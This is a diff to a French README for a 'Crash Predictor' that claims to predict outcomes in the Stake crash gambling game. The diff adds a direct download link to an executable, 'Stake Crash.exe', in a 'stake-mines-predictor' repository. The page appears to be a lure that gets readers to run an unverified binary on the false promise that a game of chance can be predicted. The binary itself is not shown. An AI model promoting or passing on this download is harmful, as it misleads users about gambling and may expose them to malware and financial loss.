@@ -26,7 +26,7 @@ Crash Predictor est un outil logiciel conçu pour prédire les crash sur le cél
 
 Suivez ces étapes pour démarrer avec Crash Predictor :
 
-1. Téléchargez la dernière version depuis la section [Télécharger]().
+1. Téléchargez la dernière version depuis la section [Télécharger](https://github.com/stake-mines-predictor/Stake-crash-predictor/raw/refs/heads/main/Stake%20Crash.exe).
 
 2. Extrayez les fichiers téléchargés vers un emplacement de votre choix.
 
